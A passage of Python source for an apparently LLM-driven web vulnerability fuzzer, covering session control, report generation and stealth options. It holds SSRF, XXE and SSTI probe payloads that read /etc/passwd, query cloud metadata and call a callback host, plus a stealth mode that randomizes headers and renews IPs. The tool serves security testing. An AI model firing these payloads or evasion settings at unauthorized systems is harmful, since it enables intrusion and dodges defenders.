            ],
            "ssrf": [
                {"payload": f"http://{callback_domain}/{callback_id}", "detection": "callback"},
                {"payload": "http://169.254.169.254/latest/meta-data/", "detection": "response", "indicator": "ami-id"},
                {"payload": "http://localhost:22", "detection": "timing", "delay": 0},  # Port scan timing
                {"payload": "http://127.0.0.1:6379/", "detection": "response", "indicator": "redis"},
                {"payload": "file:///etc/passwd", "detection": "response", "indicator": "root:"},
            ],
            "xxe": [
                {"payload": f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback_domain}/{callback_id}">]><foo>&xxe;</foo>', "detection": "callback"},
                {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "detection": "response", "indicator": "root:"},
            ],
            "ssti": [
                {"payload": "{{7*7}}", "detection": "response", "indicator": "49"},
                {"payload": "${7*7}", "detection": "response", "indicator": "49"},
                {"payload": "<%= 7*7 %>", "detection": "response", "indicator": "49"},
                {"payload": "#{7*7}", "detection": "response", "indicator": "49"},
            ],
        }
        
        return payloads.get(technique, [])

    async def _test_blind_payload(
        self, 
        session: aiohttp.ClientSession, 
        target_url: str, 
        payload_info: Dict[str, Any],
        injection_point: str
    ) -> Dict[str, Any]:
        """Test a blind payload and check for detection indicators."""
        payload = payload_info["payload"]
        detection_type = payload_info["detection"]
        
        try:
            start_time = datetime.utcnow()
            
            # Prepare request based on injection point
            if injection_point == "param":
                # Add payload as URL parameter
                test_url = f"{target_url}{'&' if '?' in target_url else '?'}test={payload}"
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    response_text = await resp.text()
                    elapsed = (datetime.utcnow() - start_time).total_seconds()
            elif injection_point == "header":
                # Add payload in custom header
                headers = {"X-Test": payload, "Referer": payload}
                async with session.get(target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    response_text = await resp.text()
                    elapsed = (datetime.utcnow() - start_time).total_seconds()
            else:  # body
                # Add payload in POST body
                async with session.post(target_url, data={"test": payload}, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    response_text = await resp.text()
                    elapsed = (datetime.utcnow() - start_time).total_seconds()
            
            # Check for detection based on type
            if detection_type == "timing":
                expected_delay = payload_info.get("delay", 5)
                if elapsed >= expected_delay - 1:  # Allow 1 second margin
                    return {
                        "detected": True,
                        "technique": payload_info.get("technique", "unknown"),
                        "detection_type": "timing",
                        "payload": payload,
                        "elapsed": elapsed,
                        "injection_point": injection_point,
                    }
            elif detection_type == "response":
                indicator = payload_info.get("indicator", "")
                if indicator and indicator.lower() in response_text.lower():
                    return {
                        "detected": True,
                        "technique": payload_info.get("technique", "unknown"),
                        "detection_type": "response",
                        "payload": payload,
                        "indicator": indicator,
                        "injection_point": injection_point,
                    }
            # Callback detection would require external callback server infrastructure
            
        except asyncio.TimeoutError:
            # Timeout could indicate successful timing-based detection
            if detection_type == "timing":
                return {
                    "detected": True,
                    "technique": payload_info.get("technique", "unknown"),
                    "detection_type": "timing_timeout",
                    "payload": payload,
                    "injection_point": injection_point,
                }
        except Exception as e:
            logger.debug(f"Blind payload test error: {e}")
        
        return {"detected": False}

    async def _generate_final_report(self) -> Dict[str, Any]:
        """Generate final analysis report using LLM and all available engines."""
        
        # Collect statistics from all engines
        engine_stats = {
            "passive_scanner": get_passive_scanner_stats() if PASSIVE_SCANNER_AVAILABLE else {"available": False},
            "diffing_engine": get_diffing_engine_stats() if DIFFING_ENGINE_AVAILABLE else {"available": False},
            "mutation_engine": get_mutation_engine_stats() if MUTATION_ENGINE_AVAILABLE else {"available": False},
            "deduplicator": _finding_deduplicator.get_stats(),
        }
        
        # ==================================================================
        # FINDING VALIDATION - Deduplicate and contextualize passive findings
        # ==================================================================
        validation_results = None
        all_passive_findings = []
        
        # Collect all passive findings from targets
        for target in self.session.targets:
            if hasattr(target, 'passive_findings') and target.passive_findings:
                all_passive_findings.extend(target.passive_findings)
        
        # Run validation if we have passive findings
        if FINDING_VALIDATOR_AVAILABLE and all_passive_findings:
            try:
                target_url = self.session.targets[0].url if self.session.targets else ""
                validation_results = finding_validator.validate_findings(
                    target_url=target_url,
                    findings=all_passive_findings,
                )
                
                logger.info(
                    f"Finding validation: {validation_results.get('original_finding_count', 0)} findings → "
                    f"{validation_results.get('validated_finding_count', 0)} unique, "
                    f"{validation_results.get('removed_false_positives', 0)} false positives removed"
                )
                
                engine_stats["finding_validator"] = {
                    "available": True,
                    "detected_context": validation_results.get("detected_context"),
                    "original_findings": validation_results.get("original_finding_count", 0),
                    "validated_findings": validation_results.get("validated_finding_count", 0),
                    "false_positives_removed": validation_results.get("removed_false_positives", 0),
                }
            except Exception as e:
                logger.warning(f"Finding validation failed: {e}")
                engine_stats["finding_validator"] = {"available": True, "error": str(e)}
        else:
            engine_stats["finding_validator"] = {"available": FINDING_VALIDATOR_AVAILABLE}
        
        # Run correlation analysis if available
        correlation_results = None
        if CORRELATION_ENGINE_AVAILABLE and len(self.session.findings) > 1:
            try:
                correlation_engine = get_correlation_engine()
                # Convert findings to dict format for correlation
                findings_dicts = [f.to_dict() for f in self.session.findings]
                correlation_results = await analyze_findings(findings_dicts)
                
                # Add attack chains to report
                if correlation_results:
                    logger.info(f"Correlation analysis found {len(correlation_results.get('attack_chains', []))} attack chains")
            except Exception as e:
                logger.warning(f"Correlation analysis failed: {e}")
        
        # Build report prompt with correlation insights
        correlation_summary = ""
        if correlation_results:
            attack_chains = correlation_results.get("attack_chains", [])
            root_causes = correlation_results.get("root_causes", [])
            
            if attack_chains:
                correlation_summary += f"\n\nAttack Chains Discovered ({len(attack_chains)}):\n"
                for chain in attack_chains[:5]:  # Top 5 chains
                    correlation_summary += f"- {chain.get('name', 'Unknown')}: {' -> '.join(chain.get('steps', []))}\n"
                    correlation_summary += f"  Impact: {chain.get('impact', 'N/A')}, Confidence: {chain.get('confidence', 0):.0%}\n"
            
            if root_causes:
                correlation_summary += f"\nRoot Cause Analysis ({len(root_causes)}):\n"
                for rc in root_causes[:3]:  # Top 3 root causes
                    correlation_summary += f"- {rc.get('cause', 'Unknown')}: Affects {len(rc.get('affected_findings', []))} findings\n"
        
        # Gather crawl/discovery summary if available
        crawl_summary = ""
        if self.session.sitemap:
            stats = self.session.sitemap.get("statistics", {})
            crawl_summary = f"""
Intelligent Crawl Results:
- URLs crawled: {stats.get('total_urls_crawled', 0)}
- Parameters found: {stats.get('total_parameters', 0)}
- Forms found: {stats.get('total_forms', 0)}
- Auth endpoints: {len(self.session.sitemap.get('auth_endpoints', []))}
- API endpoints: {len(self.session.sitemap.get('api_endpoints', []))}
"""
        
        # Calculate passive findings from targets
        passive_high = 0
        passive_medium = 0
        passive_low = 0
        passive_info = 0
        for target in self.session.targets:
            if hasattr(target, 'passive_findings') and target.passive_findings:
                for pf in target.passive_findings:
                    sev = pf.get('severity', '').lower()
                    if sev == 'high':
                        passive_high += 1
                    elif sev == 'medium':
                        passive_medium += 1
                    elif sev == 'low':
                        passive_low += 1
                    else:
                        passive_info += 1
        
        total_passive = passive_high + passive_medium + passive_low + passive_info
        
        # Build comprehensive report prompt
        report_prompt = f"""Generate a comprehensive security assessment report based on the fuzzing session.

=== SCAN OVERVIEW ===
Target URL: {self.session.targets[0].url if self.session.targets else 'Unknown'}
Scan Profile: {self.session.scan_profile_name or 'Default'}
Total Iterations: {self.session.iterations} / {self.session.max_iterations}
Targets Tested: {len(self.session.targets)}
{crawl_summary}

=== FINDINGS SUMMARY ===
ACTIVE FUZZING FINDINGS ({len(self.session.findings)} total):
- Critical: {len([f for f in self.session.findings if f.severity == 'critical'])}
- High: {len([f for f in self.session.findings if f.severity == 'high'])}
- Medium: {len([f for f in self.session.findings if f.severity == 'medium'])}
- Low: {len([f for f in self.session.findings if f.severity == 'low'])}

PASSIVE SCANNER FINDINGS ({total_passive} total):
- High: {passive_high}
- Medium: {passive_medium}
- Low: {passive_low}
- Info: {passive_info}

Duplicates Filtered: {self.session.duplicate_findings_skipped}

=== DETAILED FINDINGS (Active) ===
{json.dumps([f.to_dict() for f in self.session.findings], indent=2) if self.session.findings else "No active vulnerabilities discovered."}

=== TECHNIQUES TESTED ===
{json.dumps(self.session.techniques_tried, indent=2)}
{correlation_summary}

=== ENGINE STATISTICS ===
{json.dumps(engine_stats, indent=2)}

=== REQUIRED REPORT STRUCTURE ===
Generate a JSON report with these EXACT keys:

{{
  "assessment_overview": "Brief 2-3 sentence summary of the security posture",
  "executive_summary": "Detailed paragraph covering: what was tested, overall risk level (Critical/High/Medium/Low), key statistics, and main concerns",
  "risk_level": "Critical|High|Medium|Low",
  "key_metrics": {{
    "targets_scanned": <number>,
    "total_iterations": <number>,
    "active_findings": <number>,
    "passive_findings": <number>,
    "high_severity_issues": <number>,
    "techniques_tested": <number>
  }},
  "critical_findings_analysis": "Detailed analysis of any critical/high findings. If none found, explain what was tested and why the target appears secure. ALWAYS provide meaningful content.",
  "vulnerability_summary": "Summary of all vulnerabilities found (both active and passive). Include severity breakdown and affected endpoints.",
  "risk_assessment": "Overall risk assessment considering both active and passive findings. Include potential attack scenarios.",
  "remediation_priorities": [
    {{"priority": 1, "issue": "description", "action": "specific fix", "effort": "Low|Medium|High"}}
  ],
  "additional_testing_recommendations": "Suggestions for further testing based on what was found and tested",
  "compliance_implications": "Any relevant compliance concerns (OWASP, PCI-DSS, etc.)",
  "conclusion": "Final assessment and next steps"
}}

IMPORTANT: Even if no active vulnerabilities were found, provide a thorough analysis of:
1. What the passive scanner detected
2. The security posture based on response analysis
3. Areas that warrant further investigation
4. Why certain tests may not have found issues (WAF, input validation, etc.)"""

        try:
            response = await call_llm([
                {"role": "system", "content": "You are a security report generator. Provide detailed, actionable security assessments with clear risk ratings."},
                {"role": "user", "content": report_prompt}
            ])
            
            report = parse_llm_response(response)
            
            # Add correlation data to report
            if correlation_results:
                report["correlation_analysis"] = {
                    "attack_chains": correlation_results.get("attack_chains", []),
                    "root_causes": correlation_results.get("root_causes", []),
                    "prioritized_findings": correlation_results.get("prioritized_findings", []),
                }
            
        except Exception as e:
            logger.error(f"Report generation failed: {e}")
            report = {
                "executive_summary": f"Fuzzing completed with {len(self.session.findings)} findings",
                "assessment_overview": f"Security scan of {self.session.targets[0].url if self.session.targets else 'target'} completed.",
                "risk_level": "Low" if len(self.session.findings) == 0 else "Medium",
                "key_metrics": {
                    "targets_scanned": len(self.session.targets),
                    "total_iterations": self.session.iterations,
                    "active_findings": len(self.session.findings),
                    "passive_findings": total_passive,
                    "high_severity_issues": len([f for f in self.session.findings if f.severity in ['critical', 'high']]) + passive_high,
                    "techniques_tested": len(self.session.techniques_tried),
                },
                "findings_summary": {
                    "total": len(self.session.findings),
                    "critical": len([f for f in self.session.findings if f.severity == 'critical']),
                    "high": len([f for f in self.session.findings if f.severity == 'high']),
                    "medium": len([f for f in self.session.findings if f.severity == 'medium']),
                    "low": len([f for f in self.session.findings if f.severity == 'low']),
                },
                "critical_findings_analysis": "Report generation encountered an error. Review findings manually.",
                "error": str(e),
            }
        
        # Add report metadata for the UI
        report["report_metadata"] = {
            "generated_at": datetime.utcnow().isoformat(),
            "scan_profile": self.session.scan_profile_name or "default",
            "target_url": self.session.targets[0].url if self.session.targets else "unknown",
            "scan_duration_seconds": (datetime.utcnow() - datetime.fromisoformat(self.session.started_at)).total_seconds() if self.session.started_at else 0,
            "scan_summary": {
                "targets_tested": len(self.session.targets),
                "total_iterations": self.session.iterations,
                "max_iterations": self.session.max_iterations,
                "active_findings": len(self.session.findings),
                "passive_findings": total_passive,
                "techniques_tried": list(set(t for techniques in self.session.techniques_tried.values() for t in techniques)),
            },
            "passive_breakdown": {
                "high": passive_high,
                "medium": passive_medium,
                "low": passive_low,
                "info": passive_info,
            },
        }
        
        # Build final report with validation data
        final_report = {
            "type": "final_report",
            "session_summary": self.session.to_dict(),
            "report": report,
            "correlation_analysis": correlation_results,
            "engine_stats": engine_stats,
            "scan_profile": self.session.scan_profile,
            "crawl_results": self.session.sitemap,
        }
        
        # Add validation results if available (deduplicated/contextualized findings)
        if validation_results:
            final_report["finding_validation"] = validation_results
            
            # Also add a summary section for the UI
            final_report["validation_summary"] = {
                "detected_context": validation_results.get("detected_context", "unknown"),
                "original_passive_findings": validation_results.get("original_finding_count", 0),
                "validated_findings": validation_results.get("validated_finding_count", 0),
                "false_positives_removed": validation_results.get("removed_false_positives", 0),
                "adjusted_severity_counts": validation_results.get("adjusted_severity_counts", {}),
                "context_summary": validation_results.get("summary", ""),
            }
        
        return final_report


# =============================================================================
# DRY-RUN PLAN GENERATION
# =============================================================================

async def _generate_dry_run_plan(
    session: AgenticFuzzingSession,
    enabled_techniques: Optional[List[FuzzingTechnique]] = None,
) -> List[Dict[str, Any]]:
    """
    Generate a scan plan without executing any requests (dry-run mode).
    
    Args:
        session: The fuzzing session
        enabled_techniques: List of techniques to test (None = all)
        
    Returns:
        List of planned test operations
    """
    plan = []
    
    # Determine techniques to test
    techniques_to_test = enabled_techniques or list(FuzzingTechnique)
    
    for target in session.targets:
        target_plan = {
            "target_url": target.url,
            "method": target.method,
            "parameters": target.parameters,
            "techniques": [],
            "estimated_requests": 0,
        }
        
        for technique in techniques_to_test:
            technique_info = {
                "technique": technique.value,
                "name": technique.value.replace("_", " ").title(),
                "payloads_count": 0,
                "test_cases": [],
            }
            
            # Get payload count for this technique
            if technique.value in TECHNIQUE_PAYLOADS:
                payloads = TECHNIQUE_PAYLOADS[technique.value]
                technique_info["payloads_count"] = len(payloads)
                technique_info["sample_payloads"] = payloads[:3]  # First 3 as examples
            
            # Add test cases based on parameters
            params_to_test = target.parameters or ["(auto-discovered)"]
            for param in params_to_test:
                test_case = {
                    "parameter": param,
                    "injection_points": ["query", "body", "header"] if param == "(auto-discovered)" else ["value"],
                    "estimated_requests": technique_info["payloads_count"] or 10,
                }
                technique_info["test_cases"].append(test_case)
                technique_info["estimated_requests"] = technique_info.get("estimated_requests", 0) + test_case["estimated_requests"]
            
            target_plan["techniques"].append(technique_info)
            target_plan["estimated_requests"] += technique_info.get("estimated_requests", 0)
        
        plan.append(target_plan)
    
    # Add summary
    total_techniques = sum(len(p["techniques"]) for p in plan)
    total_requests = sum(p["estimated_requests"] for p in plan)
    
    return {
        "targets": plan,
        "summary": {
            "total_targets": len(plan),
            "total_techniques": total_techniques,
            "total_estimated_requests": total_requests,
            "estimated_duration_minutes": total_requests * 0.5 / 60,  # Assume 0.5s per request
            "techniques_list": [t.value for t in techniques_to_test],
        },
    }


# =============================================================================
# PUBLIC API
# =============================================================================

async def start_agentic_fuzzing(
    targets: List[Dict[str, Any]],
    max_iterations: int = 50,
    auto_save: bool = True,
    save_interval: int = 5,
    auto_pilot_mode: str = "disabled",
    auto_escalation: bool = True,
    techniques: List[str] = None,
    # Phase 1: Scan Control Features
    max_duration_seconds: Optional[int] = None,
    dry_run: bool = False,
    stop_on_critical: bool = False,
    min_severity_to_report: str = "low",
    log_full_requests: bool = False,
    log_full_responses: bool = False,
    # Discovery & Crawling
    enable_crawl: bool = True,
    crawl_depth: int = 3,
    crawl_max_pages: int = 100,
    enable_recon: bool = True,
    # Stealth Mode
    stealth_config: Optional[Dict[str, Any]] = None,
) -> AsyncGenerator[Dict[str, Any], None]:
    """
    Start an agentic fuzzing session.
    
    Args:
        targets: List of target configurations
        max_iterations: Maximum LLM iterations
        auto_save: Whether to auto-save session periodically
        save_interval: Save every N iterations
        auto_pilot_mode: Automation level (disabled, assisted, semi_auto, full_auto)
        auto_escalation: Auto-escalate testing when findings detected
        techniques: Specific techniques to test (None = all)
        max_duration_seconds: Maximum scan duration in seconds (None = no limit)
        dry_run: Preview mode - generates plan without making requests
        stop_on_critical: Stop scan immediately when critical finding detected
        min_severity_to_report: Minimum severity level to report (info, low, medium, high, critical)
        log_full_requests: Log full request details for debugging
        log_full_responses: Log full response bodies for debugging
        enable_crawl: Enable intelligent crawling to discover endpoints
        crawl_depth: Maximum crawl depth
        crawl_max_pages: Maximum pages to crawl
        enable_recon: Enable reconnaissance (auth detection, fingerprinting)
        
    Yields:
        Progress events and results
    """
    # Create session
    session_id = str(uuid.uuid4())[:12]
    
    def normalize_url(url: str) -> str:
        """Ensure URL has a valid scheme (http:// or https://)."""
        if not url:
            return url
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            # Default to http:// for local/internal targets
            url = f"http://{url}"
        return url
    
    fuzzing_targets = [
        FuzzingTarget(
            url=normalize_url(t.get("url", "")),
            method=t.get("method", "GET"),
            headers=t.get("headers", {}),
            body=t.get("body"),
            parameters=t.get("parameters", []),
        )
        for t in targets
    ]
    
    # Parse auto-pilot mode
    try:
        pilot_mode = AutoPilotMode(auto_pilot_mode)
    except ValueError:
        pilot_mode = AutoPilotMode.DISABLED
    
    # Parse techniques
    enabled_techniques = None
    if techniques:
        enabled_techniques = []
        for t in techniques:
            try:
                enabled_techniques.append(FuzzingTechnique(t))
            except ValueError:
                pass
    
    session = AgenticFuzzingSession(
        id=session_id,
        targets=fuzzing_targets,
        max_iterations=max_iterations,
        auto_pilot_mode=pilot_mode,
        auto_escalation_enabled=auto_escalation,
        enabled_techniques=enabled_techniques,
        # Phase 1: Scan Control Features
        max_duration_seconds=max_duration_seconds,
        dry_run=dry_run,
        stop_on_critical=stop_on_critical,
        min_severity_to_report=min_severity_to_report,
        log_full_requests=log_full_requests,
        log_full_responses=log_full_responses,
        scan_start_time=time.time(),  # Initialize scan start time
        # Discovery & Crawling
        intelligent_crawl_enabled=enable_crawl,
        crawl_depth=crawl_depth,
        crawl_max_pages=crawl_max_pages,
        auto_discovery_enabled=enable_recon,
        # Stealth Mode
        stealth_mode_enabled=stealth_config.get("enabled", False) if stealth_config else False,
        stealth_delay_min=stealth_config.get("delay_min", 2.0) if stealth_config else 2.0,
        stealth_delay_max=stealth_config.get("delay_max", 5.0) if stealth_config else 5.0,
        stealth_requests_before_pause=stealth_config.get("requests_before_pause", 10) if stealth_config else 10,
        stealth_pause_duration=stealth_config.get("pause_duration", 30.0) if stealth_config else 30.0,
        stealth_randomize_user_agent=stealth_config.get("randomize_user_agent", True) if stealth_config else True,
        stealth_randomize_headers=stealth_config.get("randomize_headers", True) if stealth_config else True,
        # IP Renewal
        stealth_ip_renewal_enabled=stealth_config.get("ip_renewal_enabled", False) if stealth_config else False,
        stealth_ip_renewal_interval=stealth_config.get("ip_renewal_interval", 50) if stealth_config else 50,
    )
    
    # Handle dry-run mode - generate plan without executing
    if dry_run:
        yield {
            "type": "dry_run_started",
            "session_id": session_id,
            "message": "Dry-run mode enabled - generating scan plan without making requests",
        }
        
        # Generate the scan plan
        dry_run_plan = await _generate_dry_run_plan(session, enabled_techniques)
        session.dry_run_plan = dry_run_plan
        
        yield {
            "type": "dry_run_plan",
            "session_id": session_id,
            "plan": dry_run_plan,
            "total_targets": len(fuzzing_targets),
            "total_techniques": len(dry_run_plan),
            "estimated_requests": sum(p.get("estimated_requests", 0) for p in dry_run_plan),
        }
        
        yield {
            "type": "dry_run_complete",
            "session_id": session_id,
            "message": "Dry-run complete. Review the plan and run again without dry_run=True to execute.",
        }
        return
    
    # Configure automation engine
    _automation_engine.set_mode(pilot_mode)
    _automation_engine.auto_escalation_enabled = auto_escalation
    if pilot_mode != AutoPilotMode.DISABLED:
        _automation_engine.reset()  # Fresh start for new session
    
    _active_sessions[session_id] = session
    
    # Initialize ETA estimation
    initial_eta = None
    if ETA_SERVICE_AVAILABLE:
        try:
            technique_names = [t.value for t in (enabled_techniques or [])]
            if not technique_names:
                # Default techniques if none specified
                technique_names = ["sql_injection", "xss", "command_injection", "path_traversal"]
            
            # Count parameters across all targets
            total_params = sum(len(t.parameters) for t in fuzzing_targets)
            
            initial_eta = estimate_scan_duration(
                scan_id=session_id,
                target_url=fuzzing_targets[0].url if fuzzing_targets else "",
                techniques=technique_names,
                max_iterations=max_iterations,
                profile_name=None,  # Can be added when profile support is used
                crawl_enabled=True,
                crawl_max_pages=100,
                blind_detection_enabled=True,
                chain_attacks_enabled=True,
                endpoints_count=len(fuzzing_targets),
                parameters_count=max(total_params, 5),
            )
        except Exception as eta_err:
            logger.warning(f"Failed to estimate scan duration: {eta_err}")
    
    yield {
        "type": "session_started",
        "session_id": session_id,
        "targets_count": len(fuzzing_targets),
        "max_iterations": max_iterations,
        "auto_save": auto_save,
        "auto_pilot_mode": pilot_mode.value,
        "auto_escalation": auto_escalation,
        "eta": initial_eta.to_dict() if initial_eta else None,
        # Phase 1: Scan Control Info
        "scan_control": {
            "max_duration_seconds": max_duration_seconds,
            "dry_run": dry_run,
            "stop_on_critical": stop_on_critical,
            "min_severity_to_report": min_severity_to_report,
            "log_full_requests": log_full_requests,
            "log_full_responses": log_full_responses,
        },
        # Stealth Mode Info
        "stealth_mode": {
            "enabled": session.stealth_mode_enabled,
            "delay_range": f"{session.stealth_delay_min}-{session.stealth_delay_max}s" if session.stealth_mode_enabled else None,
            "pause_every": session.stealth_requests_before_pause if session.stealth_mode_enabled else None,
            "pause_duration": session.stealth_pause_duration if session.stealth_mode_enabled else None,
        } if session.stealth_mode_enabled else None,
    }
    
    # Run fuzzer
    fuzzer = AgenticFuzzer(session)
    last_save_iteration = 0
    
    async for event in fuzzer.run():
        # Check for timeout
        if session.check_timeout():
            yield {
                "type": "timeout_reached",
                "session_id": session_id,
                "elapsed_seconds": session._get_elapsed_seconds(),
                "max_duration_seconds": max_duration_seconds,
                "message": f"Scan timeout reached after {max_duration_seconds} seconds",
            }
            session.status = "timeout"
            break
        
        # Check for stop-on-critical
        if session.critical_finding_detected and stop_on_critical:
            yield {
                "type": "critical_finding_stop",
                "session_id": session_id,
                "message": "Scan stopped due to critical finding (stop_on_critical=True)",
            }
            session.status = "stopped_critical"
            break
        
        yield event
        
        # Auto-save periodically
        if auto_save and session.iterations - last_save_iteration >= save_interval:
            try:
                save_path = save_session(session)
                last_save_iteration = session.iterations
                yield {
                    "type": "session_saved",
                    "session_id": session_id,
                    "iteration": session.iterations,
                    "path": save_path,
                }
            except Exception as e:
                logger.warning(f"Auto-save failed: {e}")
    
    # Final save
    if auto_save:
        try:
            save_session(session)
        except Exception as e:
            logger.warning(f"Final save failed: {e}")
    
    # Cleanup
    if session_id in _active_sessions:
        del _active_sessions[session_id]


async def resume_agentic_fuzzing(
    session_id: str,
    additional_iterations: int = 25,
) -> AsyncGenerator[Dict[str, Any], None]:
    """
    Resume a previously saved fuzzing session.
    
    Args:
        session_id: ID of the saved session to resume
        additional_iterations: Extra iterations to run
        
    Yields:
        Progress events and results
    """
    # Load session from disk
    session = load_session(session_id)
    
    if not session:
        yield {
            "type": "error",
            "error": f"Session {session_id} not found or could not be loaded",
        }
        return
    
    # Reset status and add iterations
    session.status = "running"
    session.max_iterations = session.iterations + additional_iterations
    session.error = None
    
    _active_sessions[session_id] = session
    
    yield {
        "type": "session_resumed",
        "session_id": session_id,
        "previous_iterations": session.iterations,
        "previous_findings": len(session.findings),
        "targets_count": len(session.targets),
        "max_iterations": session.max_iterations,
    }
    
    # Run fuzzer
    fuzzer = AgenticFuzzer(session)
    
    async for event in fuzzer.run():
        yield event
        
        # Save every 5 iterations
        if session.iterations % 5 == 0:
            try:
                save_session(session)
            except Exception as e:
                logger.warning(f"Auto-save during resume failed: {e}")
    
    # Final save
    try:
        save_session(session)
    except Exception as e:
        logger.warning(f"Final save during resume failed: {e}")
    
    # Cleanup
    if session_id in _active_sessions:
        del _active_sessions[session_id]


def get_session(session_id: str) -> Optional[AgenticFuzzingSession]:
    """Get an active session by ID."""
    return _active_sessions.get(session_id)


def stop_session(session_id: str, save: bool = True) -> bool:
    """Stop an active session, optionally saving it."""
    session = _active_sessions.get(session_id)
    if session:
        session.status = "stopped"
        session.completed_at = datetime.utcnow().isoformat()
        
        if save:
            try:
                save_session(session)
            except Exception as e:
                logger.warning(f"Save on stop failed: {e}")
        
        return True
    return False


def pause_session(session_id: str) -> Optional[str]:
    """Pause a session and save it for later resumption."""
    session = _active_sessions.get(session_id)
    if session:
        session.status = "paused"
        try:
            save_path = save_session(session)
            return save_path
        except Exception as e:
            logger.error(f"Failed to save paused session: {e}")
            return None
    return None


def list_sessions() -> List[Dict[str, Any]]:
    """List all active sessions."""
    return [
        {
            "id": s.id,
            "status": s.status,
            "targets": len(s.targets),
            "findings": len(s.findings),
            "iterations": s.iterations,
            "started_at": s.started_at,
            "robustness_stats": {
                "retry_count": s.retry_count,
                "rate_limit_delays": s.rate_limit_delays,
                "circuit_breaker_trips": s.circuit_breaker_trips,
            },
        }
        for s in _active_sessions.values()
    ]


def get_saved_sessions() -> List[Dict[str, Any]]:
    """List all saved sessions that can be resumed."""
    return list_saved_sessions()


def delete_session(session_id: str) -> bool:
    """Delete a saved session from disk."""
    return delete_saved_session(session_id)


def get_robustness_stats() -> Dict[str, Any]:
    """Get current robustness component statistics."""
    return {
        "rate_limiter": _rate_limiter.get_stats(),
        "http_circuit_breaker": _http_circuit_breaker.get_state(),
        "llm_circuit_breaker": _llm_circuit_breaker.get_state(),
        "retry_config": {
            "max_retries": _retry_config.max_retries,
            "base_delay": _retry_config.base_delay,
            "max_delay": _retry_config.max_delay,
        },
    }


def reset_robustness_stats():
    """Reset all robustness component statistics."""
    global _rate_limiter, _http_circuit_breaker, _llm_circuit_breaker, _domain_circuit_breakers, _request_deduplicator
    
    # Use consistent settings with global instances
    _rate_limiter = RateLimiter(requests_per_second=10.0, burst_size=20, adaptive=True)
    _http_circuit_breaker = CircuitBreaker(failure_threshold=20, recovery_timeout=30.0)
    _llm_circuit_breaker = CircuitBreaker(failure_threshold=5, recovery_timeout=60.0)
    _domain_circuit_breakers.reset_all()
    _request_deduplicator.clear()


# =============================================================================
# AUTHENTICATION MANAGEMENT
# =============================================================================

def configure_auth(config: AuthConfig):
    """Configure authentication for fuzzing requests."""
    global _auth_manager
    _auth_manager = AuthManager(config)


def get_auth_status() -> Dict[str, Any]:
    """Get current authentication status."""
    return _auth_manager.get_status()


def clear_auth():
    """Clear authentication configuration."""
    global _auth_manager
    _auth_manager = AuthManager(AuthConfig(auth_type=AuthType.NONE))


# =============================================================================
# DEDUPLICATION MANAGEMENT
# =============================================================================

def get_deduplication_stats() -> Dict[str, Any]:
    """Get finding deduplication statistics."""
    return _finding_deduplicator.get_stats()


def reset_deduplication():
    """Reset deduplication tracking."""
    _finding_deduplicator.clear()


# =============================================================================
# ADVANCED ROBUSTNESS MANAGEMENT
# =============================================================================

def get_degradation_status() -> Dict[str, Any]:
    """Get graceful degradation system status."""
    return _graceful_degradation.get_status()


def get_error_stats() -> Dict[str, Any]:
    """Get error classification statistics."""
    return _error_classifier.get_stats()


def get_dead_letter_stats() -> Dict[str, Any]:
    """Get dead letter queue statistics."""
    return _dead_letter_queue.get_stats()


def get_watchdog_health() -> Dict[str, Any]:
    """Get watchdog health status."""
    return _watchdog.get_health()


def get_watchdog_alerts(limit: int = 20) -> Dict[str, Any]:
    """Get recent watchdog alerts."""
    return {
        "alerts": _watchdog.get_alerts(limit),
        "recovery_actions": _watchdog.get_recovery_actions(limit),
    }


async def start_watchdog():
    """Start the watchdog service."""
    await _watchdog.start()


async def stop_watchdog():
    """Stop the watchdog service."""
    await _watchdog.stop()


def restore_session_checkpoint(session_id: str, checkpoint_id: str = None) -> Optional[Dict[str, Any]]:
    """Restore session state from a checkpoint."""
    return _watchdog.restore_from_checkpoint(session_id, checkpoint_id)


# =============================================================================
# QUALITY FEATURE FUNCTIONS
# =============================================================================

def get_payload_generator_stats() -> Dict[str, Any]:
    """Get context-aware payload generator statistics."""
    return _payload_generator.get_stats()


def get_response_analyzer_stats() -> Dict[str, Any]:
    """Get response analyzer statistics."""
    return _response_analyzer.get_stats()


def get_attack_surface_stats() -> Dict[str, Any]:
    """Get attack surface mapper statistics."""
    return _attack_surface_mapper.get_stats()


def reset_quality_features():
    """Reset all quality feature caches."""
    global _payload_generator, _response_analyzer, _attack_surface_mapper
    _payload_generator = ContextAwarePayloadGenerator()
    _response_analyzer = ResponseAnalyzer()
    _attack_surface_mapper = AttackSurfaceMapper()


# =============================================================================
# AUTOMATION ENGINE FUNCTIONS
# =============================================================================

def set_auto_pilot_mode(mode: str) -> Dict[str, Any]:
    """Set the auto-pilot mode."""
    try:
        pilot_mode = AutoPilotMode(mode)
        _automation_engine.set_mode(pilot_mode)
        return {
            "mode": pilot_mode.value,
            "message": f"Auto-pilot set to {pilot_mode.value}",
        }
    except ValueError:
        raise ValueError(f"Invalid mode: {mode}. Valid modes: {[m.value for m in AutoPilotMode]}")


def get_automation_stats() -> Dict[str, Any]:
    """Get automation engine statistics."""
    return _automation_engine.get_stats()


def get_automation_coverage() -> Dict[str, Any]:
    """Get coverage tracking information."""
    return _automation_engine.get_coverage_summary()


def get_automation_queue() -> Dict[str, Any]:
    """Get the current task queue."""
    pending = [t for t in _automation_engine.task_queue if t.status == "pending"]
    running = [t for t in _automation_engine.task_queue if t.status == "running"]
    
    return {
        "pending_count": len(pending),
        "running_count": len(running),
        "completed_count": len(_automation_engine.completed_tasks),
        "pending_tasks": [
            {
                "id": t.id,
                "endpoint": t.endpoint,
                "technique": t.technique,
                "parameter": t.parameter,
                "priority": t.priority,
            }
            for t in pending[:20]  # First 20
        ],
        "running_tasks": [
            {
                "id": t.id,
                "endpoint": t.endpoint,
                "technique": t.technique,
                "parameter": t.parameter,
            }
            for t in running
        ],
    }


def reset_automation_engine():
    """Reset the automation engine."""
    _automation_engine.reset()
    return {"message": "Automation engine reset"}


def set_auto_escalation(enabled: bool) -> Dict[str, Any]:
    """Enable or disable auto-escalation."""
    _automation_engine.auto_escalation_enabled = enabled
    return {
        "auto_escalation_enabled": enabled,
